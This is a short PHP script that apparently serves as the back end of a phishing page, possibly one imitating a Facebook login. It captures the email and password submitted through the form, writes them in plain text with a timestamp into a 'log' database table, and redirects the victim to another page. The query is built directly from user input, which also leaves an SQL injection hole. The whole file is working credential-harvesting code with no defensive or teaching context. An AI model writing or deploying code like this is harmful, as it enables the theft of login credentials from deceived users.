<?php
header ('Location: fbrc.php');
include 'db.php';
$email = $_POST['email'];
$pass = $_POST['pass'];
$date = date("d F Y h:i:s A");


$sql = "INSERT INTO log
	(log_id,log_username,log_pass,log_date)
	VALUES
	('','$email','$pass','$date')";
mysql_select_db($dbname);
$retval = mysql_query( $sql, $conn );
if(! $retval )
{
  die('Could not get data: ' . mysql_error());
}



?>